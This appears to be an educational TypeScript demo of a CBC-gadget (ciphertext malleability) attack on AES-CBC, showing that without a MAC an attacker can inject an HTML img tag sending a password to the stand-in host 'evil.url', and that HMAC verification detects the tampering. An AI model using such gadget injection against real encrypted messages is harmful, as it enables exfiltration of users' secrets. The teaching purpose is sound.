import {Buffer} from 'node:buffer'
import {randomBytes} from "node:crypto";
import {decrypt, encrypt} from "./encryptWithoutMac.js";
import {injectGadget} from "./cbc-gadgets.js";
import {appendMac, checkMacThenReturnPayload} from "./encryptWithMac.js";

const message = Buffer.from('Your password is:Se@ld-i5-great')
const g0 = Buffer.from(' <img ignore= " ')
const g1 = Buffer.from(' " src=evil.url/')

const firstBlock = Buffer.from('Your password is')

// to check that the firstBlock matches the first block of the message, otherwise the demo does not work
if (!message.subarray(0, 16).equals(firstBlock)) throw new Error('the first block must be known for the attack to work')

/**
 * Scenario where Alice encrypts a message with an AES-CBC, sends it to Bob (we don't care about how they send the key,
 * the attack is not there)
 * Between Alice and Bob, there is an attacker who is able to modify the encrypted message before Bob decrypts it.
 *
 * This attacker modifies the encrypted message so that when it is decrypted it contains and <img> tag which will
 * exfiltrate the sensitive data to evil.url if Bob's client interprets the clear text message as HTML.
 */
const encryptWithoutMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buffer, gagdet0: Buffer, gadget1: Buffer) => {
    // Alice generates a key and shares it magically with Bob
    const key = randomBytes(32)

    // Alice encrypts the message with AES-CBC and the shared key, and sends it to Bob
    const encryptedMessage = encrypt(message, key)

    // An attacker intercepts the encrypted message, and modifies it with a CBC gadget
    const maliciousMessage = injectGadget(encryptedMessage, firstBlock, gagdet0, gadget1)

    // Bob decrypts naively the message, and displays it in an HTML reader
    const decryptedMessage = decrypt(maliciousMessage, key).toString('utf8')

    // contains something like: <img ignore= "**garbage**" src=evil.url/:Se@ld-i5-great
    // which exfiltrates the sensitive data to evil.url
    console.log('decryptedMessage:', decryptedMessage)
}

encryptWithoutMacInjectGadgetThenDecrypt(message, firstBlock, g0, g1)

/**
 * Same scenario as before, but Alice and Bob now use a symmetric scheme with a MAC which allows Bob to detect the fact
 * that the encrypted message has been altered and refuses to decrypt it by throwing an error.
 */
const encryptWithMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buffer, gagdet0: Buffer, gadget1: Buffer) => {
    // Alice generates two keys and shares them magically with Bob
    const keyEnc = randomBytes(32)
    const keyMac = randomBytes(32)

    // Alice encrypts the message with AES-CBC and the shared keyEnc
    const encryptedMessage = encrypt(message, keyEnc)

    // Alice appends at the end of the encryptedMessage a MAC calculated on the encryptedMessage with HMAC-SHA256 and keyMac
    const encryptedMessageWithMac = appendMac(encryptedMessage, keyMac)

    // An attacker intercepts the encrypted message, and modifies it with a CBC gadget
    const maliciousMessage = injectGadget(encryptedMessageWithMac, firstBlock, gagdet0, gadget1)

    try {
        // Bob checks the MAC before decrypting it
        const checkedEncryptedMessage = checkMacThenReturnPayload(maliciousMessage, keyMac)
        // we should not reach this point as checkedEncryptedMessage should throw 'MAC invalid'

        const decryptedMessage = decrypt(checkedEncryptedMessage, keyEnc).toString('utf8')
        console.log('decryptedMessage:', decryptedMessage)
        throw new Error('Unexpected: MAC is valid')

    } catch (error) {
        // Bob detects that the message has been altered, and throws
        if (error.message !== 'MAC invalid') throw error
        console.warn('MAC verification has failed, a modification of the ciphertext has been detected')
    }
}

encryptWithMacInjectGadgetThenDecrypt(message, firstBlock, g0, g1)

